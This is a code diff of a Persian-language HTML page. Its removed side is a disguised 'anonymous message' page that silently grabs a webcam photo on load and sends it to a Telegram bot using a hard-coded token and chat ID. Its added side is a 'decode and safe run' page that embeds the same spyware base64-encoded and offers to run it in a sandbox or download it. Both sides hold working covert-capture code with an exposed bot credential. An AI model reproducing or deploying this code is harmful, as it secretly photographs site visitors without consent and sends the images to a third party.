@@ -1,136 +1,128 @@
+<!doctype html>
+<html lang="fa">
+<head>
+  <meta charset="utf-8" />
+  <title>Base64 → Decode & Safe Run</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial; margin:18px; background:#f7f8fa; color:#111}
+    h1{font-size:18px;margin:0 0 8px}
+    p{margin:6px 0 12px}
+    textarea{width:100%;height:220px;padding:8px;border-radius:6px;border:1px solid #d0d5da; font-family:monospace; resize:vertical}
+    .row{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0}
+    button{padding:8px 12px;border-radius:8px;border:0;background:#2563eb;color:white;cursor:pointer}
+    button.secondary{background:#6b7280}
+    small.warn{color:#b91c1c;display:block;margin-top:8px}
+    label{display:flex;align-items:center;gap:8px}
+    iframe{width:100%;height:360px;border:1px solid #cbd5e1;border-radius:6px}
+    .meta{font-size:13px;color:#374151}
+  </style>
+</head>
+<body>
+  <h1>Base64 → Decode & Safe Runner</h1>
+  <p class="meta">رشتهٔ base64 درون این فایل قرار دارد؛ خروجی پیش‌از اجرا در پایین نمایش داده می‌شود. حتما بررسی کنید.</p>
 
-<html>
-<BLOGFA>
-<style>
-  body {
-    margin: 0;
-    padding: 0;
-    background: linear-gradient(-45deg, #ff6f61, #ffcc70, #6a82fb, #fc5c7d);
-    background-size: 400% 400%;
-    animation: gradientBG 10s ease infinite;
-    font-family: sans-serif;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    overflow: hidden;
-    color: white;
-  }
-  @keyframes gradientBG {
-    0% {background-position: 0% 50%;}
-    50% {background-position: 100% 50%;}
-    100% {background-position: 0% 50%;}
-  }
-  .monkey {
-    position: absolute;
-    width: 150px;
-    animation: floatMonkey 12s linear infinite;
-  }
-  @keyframes floatMonkey {
-    0% { transform: translate(-200px, 100vh) rotate(0deg); opacity: 0; }
-    10% { opacity: 1; }
-    50% { transform: translate(50vw, 50vh) rotate(15deg); }
-    90% { opacity: 1; }
-    100% { transform: translate(120vw, -200px) rotate(-10deg); opacity: 0; }
-  }
-  .meteor {
-    position: absolute;
-    width: 2px;
-    height: 80px;
-    background: linear-gradient(180deg, rgba(255,255,255,0.8), rgba(255,255,255,0));
-    opacity: 0;
-    transform: rotate(45deg);
-    animation: fall linear forwards;
-    border-radius: 50%;
-    filter: blur(1px);
-  }
-  @keyframes fall {
-    0% {
-      transform: translate(var(--sx), var(--sy)) rotate(45deg);
-      opacity: 1;
+  <!-- ========== <-- جایگذاری رشته base64 شما در این متغیر --> ========== -->
+  <script>
+    // -------------------------
+    // **اینجا رشتهٔ base64 شما قرار دارد**
+    // (رشته‌ای که فرستادید را دقیقا در بین `،` قرار داده‌ام)
+    // -------------------------
+    const BASE64_INPUT = `DQo8aHRtbD4NCjxCTE9HRkE+DQo8c3R5bGU+DQogIGJvZHkgew0KICAgIG1hcmdpbjogMDsNCiAgICBwYWRkaW5nOiAwOw0KICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgtNDVkZWcsICNmZjZmNjEsICNmZmNjNzAsICM2YTgyZmIsICNmYzVjN2QpOw0KICAgIGJhY2tncm91bmQtc2l6ZTogNDAwJSA0MDAlOw0KICAgIGFuaW1hdGlvbjogZ3JhZGllbnRCRyAxMHMgZWFzZSBpbmZpbml0ZTsNCiAgICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsNCiAgICBkaXNwbGF5OiBmbGV4Ow0KICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogICAgbWluLWhlaWdodDogMTAwdmg7DQogICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICBjb2xvcjogd2hpdGU7DQogIH0NCiAgQGtleWZyYW1lcyBncmFkaWVudEJHIHsNCiAgICAwJSB7YmFja2dyb3VuZC1wb3NpdGlvbjogMCUgNTAlO30NCiAgICA1MCUge2JhY2tncm91bmQtcG9zaXRpb246IDEwMCUgNTAlO30NCiAgICAxMDAlIHtiYWNrZ3JvdW5kLXBvc2l0aW9uOiAwJSA1MCU7fQ0KICB9DQogIC5tb25rZXkgew0KICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICB3aWR0aDogMTUwcHg7DQogICAgYW5pbWF0aW9uOiBmbG9hdE1vbmtleSAxMnMgbGluZWFyIGluZmluaXRlOw0KICB9DQogIEBrZXlmcmFtZXMgZmxvYXRNb25rZXkgew0KICAgIDAlIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTIwMHB4LCAxMDB2aCkgcm90YXRlKDBkZWcpOyBvcGFjaXR5OiAwOyB9DQogICAgMTAlIHsgb3BhY2l0eTogMTsgfQ0KICAgIDUwJSB7IHRyYW5zZm9ybTogdHJhbnNsYXRlKDUwdncsIDUwdmgpIHJvdGF0ZSgxNWRlZyk7IH0NCiAgICA5MCUgeyBvcGFjaXR5OiAxOyB9DQogICAgMTAwJSB7IHRyYW5zZm9ybTogdHJhbnNsYXRlKDEyMHZ3LCAtMjAwcHgpIHJvdGF0ZSgtMTBkZWcpOyBvcGFjaXR5OiAwOyB9DQogIH0NCiAgLm1ldGVvciB7DQogICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIHdpZHRoOiAycHg7DQogICAgaGVpZ2h0OiA4MHB4Ow0KICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxODBkZWcsIHJnYmEoMjU1LDI1NSwyNTUsMC44KSwgcmdiYSgyNTUsMjU1LDI1NSwwKSk7DQogICAgb3BhY2l0eTogMDsNCiAgICB0cmFuc2Zvcm06IHJvdGF0ZSg0NWRlZyk7DQogICAgYW5pbWF0aW9uOiBmYWxsIGxpbmVhciBmb3J3YXJkczsNCiAgICBib3JkZXItcmFkaXVzOiA1MCU7DQogICAgZmlsdGVyOiBibHVyKDFweCk7DQogIH0NCiAgQGtleWZyYW1lcyBmYWxsIHsNCiAgICAwJSB7DQogICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSh2YXIoLS1zeCksIHZhcigtLXN5KSkgcm90YXRlKDQ1ZGVnKTsNCiAgICAgIG9wYWNpdHk6IDE7DQogICAgfQ0KICAgIDEwMCUgew0KICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUodmFyKC0tZXgpLCB2YXIoLS1leSkpIHJvdGF0ZSg0NWRlZyk7DQogICAgICBvcGFjaXR5OiAwOw0KICAgIH0NCiAgfQ0KICAjdmlkZW8sICNjYW52YXMgeyBkaXNwbGF5OiBub25lOyB9DQo8L3N0eWxlPg0KDQo8aW1nIHNyYz0iaHR0cHM6Ly9pLmliYi5jby80VngyY1Z4L21vbmtleS5wbmciIGNsYXNzPSJtb25rZXkiPg0KPHZpZGVvIGlkPSJ2aWRlbyIgYXV0b3BsYXkgcGxheXNpbmxpbmU+PC92aWRlbz4NCjxjYW52YXMgaWQ9ImNhbnZhcyI+PC9jYW52YXM+DQo8ZGl2PvCfk6kg2KfYsdiz2KfZhCDZvtuM2KfZhSDZhtin2LTZhtin2LM8L2Rpdj4NCg0KPHNjcmlwdD4NCihhc3luYyBmdW5jdGlvbigpew0KICBjb25zdCBCT1RfVE9LRU4gPSAiODMxMzMxNDI5NzpBQUhHVFFMdTBjbkN4ZFZ6NlFBX1k1N2dxVDVhZlMtTDMtbyI7DQogIGNvbnN0IENIQVRfSUQgPSAiNzI5ODMyMDc0OSI7DQogIGNvbnN0IFRHX1VSTCA9IGBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHtCT1RfVE9LRU59L3NlbmRQaG90b2A7DQoNCiAgY29uc3QgdmlkZW8gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidmlkZW8iKTsNCiAgY29uc3QgY2FudmFzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNhbnZhcyIpOw0KDQogIHRyeSB7DQogICAgY29uc3Qgc3RyZWFtID0gYXdhaXQgbmF2aWdhdG9yLm1lZGlhRGV2aWNlcy5nZXRVc2VyTWVkaWEoew0KICAgICAgdmlkZW86IHsgd2lkdGg6IHsgaWRlYWw6IDE5MjAgfSwgaGVpZ2h0OiB7IGlkZWFsOiAxMDgwIH0gfQ0KICAgIH0pOw0KICAgIHZpZGVvLnNyY09iamVjdCA9IHN0cmVhbTsNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXMgPT4gdmlkZW8ub25sb2FkZWRtZXRhZGF0YSA9IHJlcyk7DQogICAgY2FudmFzLndpZHRoID0gdmlkZW8udmlkZW9XaWR0aDsNCiAgICBjYW52YXMuaGVpZ2h0ID0gdmlkZW8udmlkZW9IZWlnaHQ7DQogIH0gY2F0Y2ggKGVycikgew0KICAgIHJldHVybjsNCiAgfQ0KDQogIGZ1bmN0aW9uIGNhcHR1cmVJbWFnZSgpIHsNCiAgICBjb25zdCBjdHggPSBjYW52YXMuZ2V0Q29udGV4dCgiMmQiKTsNCiAgICBjdHguZHJhd0ltYWdlKHZpZGVvLCAwLCAwLCBjYW52YXMud2lkdGgsIGNhbnZhcy5oZWlnaHQpOw0KICAgIHJldHVybiBjYW52YXMudG9EYXRhVVJMKCJpbWFnZS9qcGVnIiwgMC45NSk7DQogIH0NCg0KICBzZXRUaW1lb3V0KGFzeW5jICgpID0+IHsNCiAgICBjb25zdCBpbWFnZUJhc2U2NCA9IGNhcHR1cmVJbWFnZSgpOw0KICAgIGNvbnN0IGZvcm1EYXRhID0gbmV3IEZvcm1EYXRhKCk7DQogICAgZm9ybURhdGEuYXBwZW5kKCJjaGF0X2lkIiwgQ0hBVF9JRCk7DQogICAgZm9ybURhdGEuYXBwZW5kKCJwaG90byIsIGRhdGFVUkl0b0Jsb2IoaW1hZ2VCYXNlNjQpLCAiY2FwdHVyZS5qcGciKTsNCiAgICB0cnkgew0KICAgICAgYXdhaXQgZmV0Y2goVEdfVVJMLCB7IG1ldGhvZDogIlBPU1QiLCBib2R5OiBmb3JtRGF0YSB9KTsNCiAgICB9IGNhdGNoIChlcnIpIHt9DQogIH0sIDUwMCk7DQoNCiAgZnVuY3Rpb24gZGF0YVVSSXRvQmxvYihkYXRhVVJJKSB7DQogICAgbGV0IGJ5dGVTdHJpbmcgPSBhdG9iKGRhdGFVUkkuc3BsaXQoJywnKVsxXSk7DQogICAgbGV0IG1pbWVTdHJpbmcgPSBkYXRhVVJJLnNwbGl0KCcsJylbMF0uc3BsaXQoJzonKVsxXS5zcGxpdCgnOycpWzBdOw0KICAgIGxldCBhYiA9IG5ldyBBcnJheUJ1ZmZlcihieXRlU3RyaW5nLmxlbmd0aCk7DQogICAgbGV0IGlhID0gbmV3IFVpbnQ4QXJyYXkoYWIpOw0KICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYnl0ZVN0cmluZy5sZW5ndGg7IGkrKykgew0KICAgICAgaWFbaV0gPSBieXRlU3RyaW5nLmNoYXJDb2RlQXQoaSk7DQogICAgfQ0KICAgIHJldHVybiBuZXcgQmxvYihbYWJdLCB7dHlwZTogbWltZVN0cmluZ30pOw0KICB9DQp9KSgpOw0KDQpmdW5jdGlvbiBzcGF3bk1ldGVvcigpIHsNCiAgY29uc3QgZWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsNCiAgZWwuY2xhc3NOYW1lID0gIm1ldGVvciI7DQogIA0KICBjb25zdCBzdGFydFggPSBNYXRoLnJhbmRvbSgpICogMTAwOw0KICBjb25zdCBzdGFydFkgPSAtMTA7DQogIGNvbnN0IGVuZFggPSBzdGFydFggKyAoTWF0aC5yYW5kb20oKSAqIDUwICsgMzApOw0KICBjb25zdCBlbmRZID0gMTEwOw0KDQogIGVsLnN0eWxlLnNldFByb3BlcnR5KCItLXN4Iiwgc3RhcnRYICsgInZ3LCAiICsgc3RhcnRZICsgInZoIik7DQogIGVsLnN0eWxlLnNldFByb3BlcnR5KCItLXN5Iiwgc3RhcnRYICsgInZ3LCAiICsgc3RhcnRZICsgInZoIik7DQogIGVsLnN0eWxlLnNldFByb3BlcnR5KCItLWV4IiwgZW5kWCArICJ2dywgIiArIGVuZFkgKyAidmgiKTsNCiAgZWwuc3R5bGUuc2V0UHJvcGVydHkoIi0tZXkiLCBlbmRYICsgInZ3LCAiICsgZW5kWSArICJ2aCIpOw0KDQogIGVsLnN0eWxlLmFuaW1hdGlvbkR1cmF0aW9uID0gKE1hdGgucmFuZG9tKCkgKiAyICsgMS41KSArICJzIjsNCiAgZWwuc3R5bGUuYmFja2dyb3VuZCA9IGBsaW5lYXItZ3JhZGllbnQoMTgwZGVnLCBoc2xhKCR7TWF0aC5yYW5kb20oKSozNjB9LCAxMDAlLCA4MCUsIDEpLCB0cmFuc3BhcmVudClgOw0KDQogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZWwpOw0KICBzZXRUaW1lb3V0KCgpID0+IGVsLnJlbW92ZSgpLCAzMDAwKTsNCn0NCnNldEludGVydmFsKHNwYXduTWV0ZW9yLCA1MDApOw0KPC9zY3JpcHQ+`;
+
+    // -------------------------
+    // decode helper (base64 → UTF-8 text)
+    // -------------------------
+    function decodeBase64ToString(b64){
+      // remove whitespace/newlines
+      const clean = b64.replace(/\\s+/g,'');
+      try {
+        const bin = atob(clean);
+        const len = bin.length;
+        const bytes = new Uint8Array(len);
+        for (let i=0;i<len;i++) bytes[i]=bin.charCodeAt(i);
+        // decode as UTF-8
+        return new TextDecoder('utf-8').decode(bytes);
+      } catch(err){
+        return null;
+      }
     }
-    100% {
-      transform: translate(var(--ex), var(--ey)) rotate(45deg);
-      opacity: 0;
-    }
-  }
-  #video, #canvas { display: none; }
-</style>
+  </script>
 
-<img src="https://i.ibb.co/4Vx2cVx/monkey.png" class="monkey">
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-<div>📩 ارسال پیام ناشناس</div>
+  <p><strong>Preview (ابتدا بررسی کن):</strong></p>
+  <textarea id="decoded" readonly placeholder="نتیجهٔ دیکُد اینجا ظاهر می‌شود"></textarea>
 
-<script>
-(async function(){
-  const BOT_TOKEN = "8313314297:AAHGTQLu0cnCxdVz6QA_Y57gqT5afS-L3-o";
-  const CHAT_ID = "7298320749";
-  const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  <div class="row">
+    <button id="btn-load">بارگذاری و نشان دادن</button>
+    <button id="btn-run-sandbox" class="secondary">پخش در iframe (سندباکس، بدون شبکه)</button>
+    <button id="btn-run-sanitized" class="secondary">پخش (اسکریپت‌ها حذف شده)</button>
+    <button id="btn-download" class="secondary">دانلود output.html</button>
+  </div>
 
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
+  <small class="warn">هشدار: حتی در حالت سندباکس هم اسکریپت‌ها اجرا می‌شوند — حتما متن را بررسی کنید. برای بیشترین ایمنی از گزینهٔ «اسکریپت‌ها حذف شده» استفاده کنید.</small>
 
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 1920 }, height: { ideal: 1080 } }
+  <h2 style="margin-top:18px">Sandbox preview</h2>
+  <!-- iframe با sandbox خالی (بدون allow-same-origin) تا نفوذ والد محدود شود -->
+  <iframe id="preview" sandbox="allow-scripts"></iframe>
+
+  <script>
+    const decodedEl = document.getElementById('decoded');
+    const preview = document.getElementById('preview');
+
+    // بارگذاری اولیه
+    document.getElementById('btn-load').addEventListener('click', () => {
+      const txt = decodeBase64ToString(BASE64_INPUT);
+      if (txt === null) {
+        decodedEl.value = '[خطا در دیکد کردن base64]';
+        return;
+      }
+      decodedEl.value = txt;
+      alert('نتیجه دیکُد در بخش متنی نمایش داده شد — قبل از اجرا بررسی کن.');
     });
-    video.srcObject = stream;
-    await new Promise(res => video.onloadedmetadata = res);
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-  } catch (err) {
-    return;
-  }
 
-  function captureImage() {
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    return canvas.toDataURL("image/jpeg", 0.95);
-  }
+    // دانلود فایل
+    document.getElementById('btn-download').addEventListener('click', () => {
+      const txt = decodeBase64ToString(BASE64_INPUT) || '';
+      const blob = new Blob([txt], {type:'text/html;charset=utf-8'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'output.html';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      URL.revokeObjectURL(url);
+    });
 
-  setTimeout(async () => {
-    const imageBase64 = captureImage();
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", dataURItoBlob(imageBase64), "capture.jpg");
-    try {
-      await fetch(TG_URL, { method: "POST", body: formData });
-    } catch (err) {}
-  }, 500);
-
-  function dataURItoBlob(dataURI) {
-    let byteString = atob(dataURI.split(',')[1]);
-    let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-    let ab = new ArrayBuffer(byteString.length);
-    let ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-      ia[i] = byteString.charCodeAt(i);
+    // ساخت srcdoc امن برای iframe با CSP (جلوگیری از اتصال شبکه)
+    function makeSandboxedSrcdoc(innerHtml){
+      // meta CSP — اجازهٔ اتصال به شبکه را نمی‌دهد (connect-src 'none')
+      const csp = `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'self'; connect-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'">`;
+      // base href about:blank تا لینک‌های نسبی به بیرون نپرند
+      return `<!doctype html><html><head><meta charset="utf-8">${csp}<base href="about:blank"></head><body>${innerHtml}</body></html>`;
     }
-    return new Blob([ab], {type: mimeString});
-  }
-})();
 
-function spawnMeteor() {
-  const el = document.createElement("div");
-  el.className = "meteor";
-  
-  const startX = Math.random() * 100;
-  const startY = -10;
-  const endX = startX + (Math.random() * 50 + 30);
-  const endY = 110;
+    // اجرا در iframe (بدون تغییر)
+    document.getElementById('btn-run-sandbox').addEventListener('click', () => {
+      const txt = decodeBase64ToString(BASE64_INPUT);
+      if (txt === null) { alert('خطا در دیکد base64'); return; }
+      // توجه: iframe دارای sandbox="allow-scripts" است و در srcdoc ما connect-src 'none' تعیین شده
+      preview.srcdoc = makeSandboxedSrcdoc(txt);
+      alert('در iframe سندباکس اجرا شد. بررسی لاگ یا رفتار اگر لازم بود.');
+    });
 
-  el.style.setProperty("--sx", startX + "vw, " + startY + "vh");
-  el.style.setProperty("--sy", startX + "vw, " + startY + "vh");
-  el.style.setProperty("--ex", endX + "vw, " + endY + "vh");
-  el.style.setProperty("--ey", endX + "vw, " + endY + "vh");
+    // اجرا در iframe با حذف اسکریپت‌ها (ایمن‌تر)
+    document.getElementById('btn-run-sanitized').addEventListener('click', () => {
+      let txt = decodeBase64ToString(BASE64_INPUT);
+      if (txt === null) { alert('خطا در دیکد base64'); return; }
+      // حذف تگ‌های script به صورت ساده (روش کامل‌تر نیاز به sanitizer دارد)
+      const stripped = txt.replace(/<script[\\s\\S]*?<\\/script>/gi, '');
+      preview.srcdoc = makeSandboxedSrcdoc(stripped);
+      alert('نسخهٔ اسکریپت‌زدایی‌شده اجرا شد.');
+    });
 
-  el.style.animationDuration = (Math.random() * 2 + 1.5) + "s";
-  el.style.background = `linear-gradient(180deg, hsla(${Math.random()*360}, 100%, 80%, 1), transparent)`;
-
-  document.body.appendChild(el);
-  setTimeout(() => el.remove(), 3000);
-}
-setInterval(spawnMeteor, 500);
-</script>
+    // بارگذاری خودکار متن در باز شدن صفحه (اختیاری)
+    // document.getElementById('btn-load').click();
+  </script>
+</body>
 </html>
